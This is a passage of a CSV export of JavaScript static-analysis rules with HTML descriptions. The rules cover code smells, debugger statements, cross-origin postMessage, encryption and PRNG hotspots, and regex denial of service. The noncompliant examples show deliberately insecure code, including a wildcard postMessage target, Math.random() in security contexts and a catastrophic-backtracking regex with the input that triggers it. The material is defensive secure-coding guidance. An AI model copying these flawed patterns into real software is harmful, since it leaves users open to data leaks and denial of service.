</ul>",Multiline blocks should be enclosed in curly braces,[],MAJOR,"['cert', 'cwe']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Assignments within sub-expressions are hard to spot and therefore make the code less readable. Ideally, sub-expressions should not have
side-effects.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ((str = cont.substring(pos1, pos2)) != '') {  // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
str = cont.substring(pos1, pos2);
if (str != '') {
  //...
}
</pre>
<h2>Exceptions</h2>
<p>Assignments in <code>while</code> statement conditions, and assignments enclosed in relational expressions are allowed.</p>
<pre>
while ((line = nextLine()) != null) {...}  // Compliant

while (line = nextLine()) {...}  // Compliant

if (line = nextLine()) {...}  // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.1 - Assignment operators shall not be used in expressions that yield a Boolean value </li>
  <li> MISRA C++:2008, 6-2-1 - Assignment operators shall not be used in sub-expressions </li>
  <li> MISRA C:2012, 13.4 - The result of an assignment operator should not be used </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/481.html"">MITRE, CWE-481</a> - Assigning instead of Comparing </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/nYFtAg"">CERT, EXP45-C.</a> - Do not perform assignments in selection statements </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/1gCTAw"">CERT, EXP51-J.</a> - Do not perform assignments in conditional expressions
  </li>
</ul>",javascript:AssignmentWithinCondition,js,JavaScript,"<p>Assignments within sub-expressions are hard to spot and therefore make the code less readable. Ideally, sub-expressions should not have
side-effects.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ((str = cont.substring(pos1, pos2)) != '') {  // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
str = cont.substring(pos1, pos2);
if (str != '') {
  //...
}
</pre>
<h2>Exceptions</h2>
<p>Assignments in <code>while</code> statement conditions, and assignments enclosed in relational expressions are allowed.</p>
<pre>
while ((line = nextLine()) != null) {...}  // Compliant

while (line = nextLine()) {...}  // Compliant

if (line = nextLine()) {...}  // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.1 - Assignment operators shall not be used in expressions that yield a Boolean value </li>
  <li> MISRA C++:2008, 6-2-1 - Assignment operators shall not be used in sub-expressions </li>
  <li> MISRA C:2012, 13.4 - The result of an assignment operator should not be used </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/481.html"">MITRE, CWE-481</a> - Assigning instead of Comparing </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/nYFtAg"">CERT, EXP45-C.</a> - Do not perform assignments in selection statements </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/1gCTAw"">CERT, EXP51-J.</a> - Do not perform assignments in conditional expressions
  </li>
</ul>",Assignments should not be made from within sub-expressions,[],MAJOR,"['cert', 'cwe', 'misra', 'suspicious']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The debugger statement can be placed anywhere in procedures to suspend execution. Using the debugger statement is similar to setting a breakpoint
in the code. By definition such statement must absolutely be removed from the source code to prevent any unexpected behavior or added vulnerability to
attacks in production.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (i = 1; i&lt;5; i++) {
  // Print i to the Output window.
  Debug.write(""loop index is "" + i);
  // Wait for user to resume.
  debugger;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (i = 1; i&lt;5; i++) {
  // Print i to the Output window.
  Debug.write(""loop index is "" + i);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489.html"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>",javascript:DebuggerStatement,js,JavaScript,"<p>The debugger statement can be placed anywhere in procedures to suspend execution. Using the debugger statement is similar to setting a breakpoint
in the code. By definition such statement must absolutely be removed from the source code to prevent any unexpected behavior or added vulnerability to
attacks in production.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (i = 1; i&lt;5; i++) {
  // Print i to the Output window.
  Debug.write(""loop index is "" + i);
  // Wait for user to resume.
  debugger;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (i = 1; i&lt;5; i++) {
  // Print i to the Output window.
  Debug.write(""loop index is "" + i);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489.html"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>",Debugger statements should not be used,[],MINOR,"['cwe', 'owasp-a3', 'user-experience']",VULNERABILITY
2015-05-20T05:01:36+0200,"<p>A dead store happens when a local variable is assigned a value that is not read by any subsequent instruction. Calculating or retrieving a value
only to then overwrite it or throw it away, could indicate a serious error in the code. Even if it's not an error, it is at best a waste of resources.
Therefore all calculated values should be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
i = a + b; // Noncompliant; calculation result not used before value is overwritten
i = compute();
</pre>
<h2>Compliant Solution</h2>
<pre>
i = a + b;
i += compute();
</pre>
<h2>Exceptions</h2>
<p>This rule ignores initializations to -1, 0, 1, <code>null</code>, <code>undefined</code>, <code>true</code>, <code>false</code>, <code>""""</code>,
<code>[]</code> and <code>{}</code>. </p>
<p>This rule also ignores variables declared with object destructuring using rest syntax (used to exclude some properties from object):</p>
<pre>
let {a, b, ...rest} = obj; // 'a' and 'b' are ok
doSomething(rest);

let [x1, x2, x3] = arr;    // but 'x1' is noncompliant, as omitting syntax can be used: ""let [, x2, x3] = arr;""
doSomething(x2, x3);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/563.html"">MITRE, CWE-563</a> - Assignment to Variable without Use ('Unused Variable') </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/QYA5"">CERT, MSC13-C.</a> - Detect and remove unused values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/uQCSBg"">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
</ul>",javascript:S1854,js,JavaScript,"<p>A dead store happens when a local variable is assigned a value that is not read by any subsequent instruction. Calculating or retrieving a value
only to then overwrite it or throw it away, could indicate a serious error in the code. Even if it's not an error, it is at best a waste of resources.
Therefore all calculated values should be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
i = a + b; // Noncompliant; calculation result not used before value is overwritten
i = compute();
</pre>
<h2>Compliant Solution</h2>
<pre>
i = a + b;
i += compute();
</pre>
<h2>Exceptions</h2>
<p>This rule ignores initializations to -1, 0, 1, <code>null</code>, <code>undefined</code>, <code>true</code>, <code>false</code>, <code>""""</code>,
<code>[]</code> and <code>{}</code>. </p>
<p>This rule also ignores variables declared with object destructuring using rest syntax (used to exclude some properties from object):</p>
<pre>
let {a, b, ...rest} = obj; // 'a' and 'b' are ok
doSomething(rest);

let [x1, x2, x3] = arr;    // but 'x1' is noncompliant, as omitting syntax can be used: ""let [, x2, x3] = arr;""
doSomething(x2, x3);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/563.html"">MITRE, CWE-563</a> - Assignment to Variable without Use ('Unused Variable') </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/QYA5"">CERT, MSC13-C.</a> - Detect and remove unused values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/uQCSBg"">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
</ul>",Dead stores should be removed,[],MAJOR,"['cert', 'cwe', 'unused']",CODE_SMELL
2015-07-09T16:59:47+0200,"<p>HTML5 adds the ability to send messages to documents served from other domains. According to the specification:</p>
<blockquote>
  Authors should not use the wildcard keyword (
  <code>*</code>) in the
  <code>targetOrigin</code> argument in messages that contain any confidential information, as otherwise there is no way to guarantee that the message
  is only delivered to the recipient to which it was intended.
</blockquote>
<p>To mitigate the risk of sending sensitive information to a document served from a hostile or unknown domain, this rule raises an issue each time
<code>Window.postMessage</code> is used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var myWindow = document.getElementById('myIFrame').contentWindow;
myWindow.postMessage(message, ""*""); // Noncompliant; how do you know what you loaded in 'myIFrame' is still there?
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
</ul>",javascript:S2819,js,JavaScript,"<p>HTML5 adds the ability to send messages to documents served from other domains. According to the specification:</p>
<blockquote>
  Authors should not use the wildcard keyword (
  <code>*</code>) in the
  <code>targetOrigin</code> argument in messages that contain any confidential information, as otherwise there is no way to guarantee that the message
  is only delivered to the recipient to which it was intended.
</blockquote>
<p>To mitigate the risk of sending sensitive information to a document served from a hostile or unknown domain, this rule raises an issue each time
<code>Window.postMessage</code> is used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var myWindow = document.getElementById('myIFrame').contentWindow;
myWindow.postMessage(message, ""*""); // Noncompliant; how do you know what you loaded in 'myIFrame' is still there?
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
</ul>",Cross-document messaging domains should be carefully restricted,[],CRITICAL,"['html5', 'owasp-a7']",VULNERABILITY
2019-03-04T09:37:21+0100,"<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7902"">CVE-2017-7902</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1378"">CVE-2006-1378</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1376"">CVE-2003-1376</a> </li>
</ul>
<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed
regularly. However these are not the only means to defeat or weaken an encryption.</p>
<p> </p>
<p>This rule flags function calls that initiate encryption/decryption. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the private key might not be random, strong enough or the same key is reused for a long long time. </li>
  <li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li>
  <li> the key exchange is made without properly authenticating the receiver. </li>
  <li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time
  passes. </li>
  <li> the chosen encryption library is deemed unsafe. </li>
  <li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li>
  <li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.
  </li>
  <li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it's IV (Initialization Vector) is not generated using a secure random
  algorithm, or it is reused. </li>
  <li> the Advanced Encryption Standard (AES) encryption algorithm is used with an unsecure mode. See the recommended practices for more information.
  </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Generate encryption keys using secure random algorithms. </li>
  <li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force
  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.
  </li>
  <li> Regenerate the keys regularly. </li>
  <li> Always store the keys in a safe location and transfer them only over safe channels. </li>
  <li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li>
  <li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are
  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms as they will most
  probably have flaws. </li>
  <li> When a nonce is used, generate it randomly every time. </li>
  <li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li>
  <li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks
  like ""Chosen-Plaintext Attacks"". Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption
  cycle, because the IV's purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li>
  <li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be
  preferred to the following combinations which are not secured:
    <ul>
      <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it
      does not hide data patterns well. In some senses, it doesn't provide serious message confidentiality, and it is not recommended for use in
      cryptographic protocols at all. </li>
      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>
    </ul> </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
// === Client side ===
crypto.subtle.encrypt(algo, key, plainData); // Questionable
crypto.subtle.decrypt(algo, key, encData); // Questionable
</pre>
<pre>
// === Server side ===
const crypto = require(""crypto"");
const cipher = crypto.createCipher(algo, key); // Questionable
const cipheriv = crypto.createCipheriv(algo, key, iv); // Questionable
const decipher = crypto.createDecipher(algo, key); // Questionable
const decipheriv = crypto.createDecipheriv(algo, key, iv); // Questionable
const pubEnc = crypto.publicEncrypt(key, buf); // Questionable
const privDec = crypto.privateDecrypt({ key: key, passphrase: secret }, pubEnc); // Questionable
const privEnc = crypto.privateEncrypt({ key: key, passphrase: secret }, buf); // Questionable
const pubDec = crypto.publicDecrypt(key, privEnc); // Questionable
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/321.html"">MITRE, CWE-321</a> - Use of Hard-coded Cryptographic Key </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/322.html"">MITRE, CWE-322</a> - Key Exchange without Entity Authentication </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/323.html"">MITRE, CWE-323</a> - Reusing a Nonce, Key Pair in Encryption </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/324.html"">MITRE, CWE-324</a> - Use of a Key Past its Expiration Date </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/325.html"">MITRE, CWE-325</a> - Missing Required Cryptographic Step </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/326.html"">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/327.html"">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/522.html"">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li>
  <li> [OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> [OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",javascript:S4787,js,JavaScript,"<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7902"">CVE-2017-7902</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1378"">CVE-2006-1378</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1376"">CVE-2003-1376</a> </li>
</ul>
<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed
regularly. However these are not the only means to defeat or weaken an encryption.</p>
<p> </p>
<p>This rule flags function calls that initiate encryption/decryption. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the private key might not be random, strong enough or the same key is reused for a long long time. </li>
  <li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li>
  <li> the key exchange is made without properly authenticating the receiver. </li>
  <li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time
  passes. </li>
  <li> the chosen encryption library is deemed unsafe. </li>
  <li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li>
  <li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.
  </li>
  <li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it's IV (Initialization Vector) is not generated using a secure random
  algorithm, or it is reused. </li>
  <li> the Advanced Encryption Standard (AES) encryption algorithm is used with an unsecure mode. See the recommended practices for more information.
  </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Generate encryption keys using secure random algorithms. </li>
  <li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force
  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.
  </li>
  <li> Regenerate the keys regularly. </li>
  <li> Always store the keys in a safe location and transfer them only over safe channels. </li>
  <li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li>
  <li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are
  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms as they will most
  probably have flaws. </li>
  <li> When a nonce is used, generate it randomly every time. </li>
  <li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li>
  <li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks
  like ""Chosen-Plaintext Attacks"". Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption
  cycle, because the IV's purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li>
  <li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be
  preferred to the following combinations which are not secured:
    <ul>
      <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it
      does not hide data patterns well. In some senses, it doesn't provide serious message confidentiality, and it is not recommended for use in
      cryptographic protocols at all. </li>
      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>
    </ul> </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
// === Client side ===
crypto.subtle.encrypt(algo, key, plainData); // Questionable
crypto.subtle.decrypt(algo, key, encData); // Questionable
</pre>
<pre>
// === Server side ===
const crypto = require(""crypto"");
const cipher = crypto.createCipher(algo, key); // Questionable
const cipheriv = crypto.createCipheriv(algo, key, iv); // Questionable
const decipher = crypto.createDecipher(algo, key); // Questionable
const decipheriv = crypto.createDecipheriv(algo, key, iv); // Questionable
const pubEnc = crypto.publicEncrypt(key, buf); // Questionable
const privDec = crypto.privateDecrypt({ key: key, passphrase: secret }, pubEnc); // Questionable
const privEnc = crypto.privateEncrypt({ key: key, passphrase: secret }, buf); // Questionable
const pubDec = crypto.publicDecrypt(key, privEnc); // Questionable
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/321.html"">MITRE, CWE-321</a> - Use of Hard-coded Cryptographic Key </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/322.html"">MITRE, CWE-322</a> - Key Exchange without Entity Authentication </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/323.html"">MITRE, CWE-323</a> - Reusing a Nonce, Key Pair in Encryption </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/324.html"">MITRE, CWE-324</a> - Use of a Key Past its Expiration Date </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/325.html"">MITRE, CWE-325</a> - Missing Required Cryptographic Step </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/326.html"">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/327.html"">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/522.html"">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li>
  <li> [OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> [OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Encrypting data is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a3', 'owasp-a6', 'sans-top25-porous']",SECURITY_HOTSPOT
2019-03-04T09:37:21+0100,"<p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386"">CVE-2013-6386</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419"">CVE-2006-3419</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102"">CVE-2008-4102</a> </li>
</ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the <code>Math.random()</code> function relies on a weak pseudorandom number generator, this function should not be used for security-critical
applications or for protecting sensitive data. In such context, a cryptographically strong pseudorandom number generator (CSPRNG) should be used
instead.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li>
  <li> the function you use generates a value which can be predicted (pseudo-random). </li>
  <li> the generated value is used multiple times. </li>
  <li> an attacker can access the generated value. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use a cryptographically strong pseudorandom number generator (CSPRNG) like <code>crypto.getRandomValues()</code>. </li>
  <li> Use the generated random values only once. </li>
  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
const val = Math.random(); // Questionable
// Check if val is used in a security context.
</pre>
<h2>Compliant Solution</h2>
<pre>
// === Client side ===
const crypto = window.crypto || window.msCrypto;
var array = new Uint32Array(1);
crypto.getRandomValues(array); // Compliant for security-sensitive use cases

// === Server side ===
const crypto = require('crypto');
const buf = crypto.randomBytes(1); // Compliant for security-sensitive use cases
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/338.html"">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator
  (PRNG) </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/330.html"">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/326.html"">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/310"">MITRE, CWE-310</a> - Cryptographic Issues </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/mAFqAQ"">CERT, MSC02-J.</a> - Generate strong random numbers </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qw4"">CERT, MSC30-C.</a> - Do not use the rand() function for generating pseudorandom
  numbers </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/WYIyAQ"">CERT, MSC50-CPP.</a> - Do not use std::rand() for generating pseudorandom
  numbers </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> Derived from FindSecBugs rule <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM"">Predictable Pseudo Random Number
  Generator</a> </li>
</ul>",javascript:S2245,js,JavaScript,"<p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386"">CVE-2013-6386</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419"">CVE-2006-3419</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102"">CVE-2008-4102</a> </li>
</ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the <code>Math.random()</code> function relies on a weak pseudorandom number generator, this function should not be used for security-critical
applications or for protecting sensitive data. In such context, a cryptographically strong pseudorandom number generator (CSPRNG) should be used
instead.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li>
  <li> the function you use generates a value which can be predicted (pseudo-random). </li>
  <li> the generated value is used multiple times. </li>
  <li> an attacker can access the generated value. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use a cryptographically strong pseudorandom number generator (CSPRNG) like <code>crypto.getRandomValues()</code>. </li>
  <li> Use the generated random values only once. </li>
  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
const val = Math.random(); // Questionable
// Check if val is used in a security context.
</pre>
<h2>Compliant Solution</h2>
<pre>
// === Client side ===
const crypto = window.crypto || window.msCrypto;
var array = new Uint32Array(1);
crypto.getRandomValues(array); // Compliant for security-sensitive use cases

// === Server side ===
const crypto = require('crypto');
const buf = crypto.randomBytes(1); // Compliant for security-sensitive use cases
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/338.html"">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator
  (PRNG) </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/330.html"">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/326.html"">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/310"">MITRE, CWE-310</a> - Cryptographic Issues </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/mAFqAQ"">CERT, MSC02-J.</a> - Generate strong random numbers </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qw4"">CERT, MSC30-C.</a> - Do not use the rand() function for generating pseudorandom
  numbers </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/WYIyAQ"">CERT, MSC50-CPP.</a> - Do not use std::rand() for generating pseudorandom
  numbers </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> Derived from FindSecBugs rule <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM"">Predictable Pseudo Random Number
  Generator</a> </li>
</ul>",Using pseudorandom number generators (PRNGs) is security-sensitive,[],CRITICAL,"['cert', 'cwe', 'owasp-a3']",SECURITY_HOTSPOT
2019-03-04T09:37:21+0100,"<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16021"">CVE-2017-16021</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13863"">CVE-2018-13863</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8926"">CVE-2018-8926</a> </li>
</ul>
<p>Regular Expressions are subject to different kinds of vulnerabilities.</p>
<p> </p>
<p>First, evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions
such as <code>(a+)+</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</code>. The problem is that
with every additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular
expression, <code>a+</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating user-provided strings as regular expressions opens the door to <a
href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">Regular expression Denial of Service (ReDoS)</a> attacks. In the
context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making the
service inaccessible to genuine users.</p>
<p> </p>
<p>Another type of vulnerability can occur when regular expressions are used to validate user input. A regular expression can be used to filter unsafe
input by either matching a whole input when it is valid (example: the whole string should only contain alphanumeric characters) or by detecting
dangerous parts of an input. In both cases it is possible to let dangerous values through. For example, searching for <code>&lt;script&gt;</code> tags
in some HTML code with the regular expression <code>.*&lt;script&gt;.*</code> will miss <code>&lt;script id=""test""&gt;</code>.</p>
<p> </p>
<p>This rule flags any regular expression execution or compilation for review.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> a user input string is executed as a regular-expression, or it is inserted in a regular expression. </li>
  <li> a user can provide a string which will be analyzed by a regular expression. </li>
  <li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li>
  <li> the regular expression is used to validate unsafe input, but it does not detect all dangerous values. </li>
</ul>
<p>You may be at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid executing a user input string as a regular expression. If this is required, restrict the allowed regular expressions.</p>
<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for
vulnerability reports mentioning the one engine you're are using.</p>
<p>Test your regular expressions with techniques such as equivalence partitioning, and boundary value analysis, and test for robustness. Try not to
make complex regular expressions as they are difficult to understand and test. Note that some regular expression engines will match only part of the
input if no anchors are used. In PHP for example <code>preg_match(""/[A-Za-z0-9]+/"", $text)</code> will accept any string containing at least one
alphanumeric character because it has no anchors.</p>
<h2>Questionable Code Example</h2>
<pre>
const regex = /(a+)+/; // RegExp object from regex literal
const regex = new RegExp(regex); // RegExp object from string

// All the following method calls are questionable. Validate the regular expression and matched string.
str.search(regex);
str.match(regex);
str.split(regex);
str.replace(regex);
regex.exec(str);
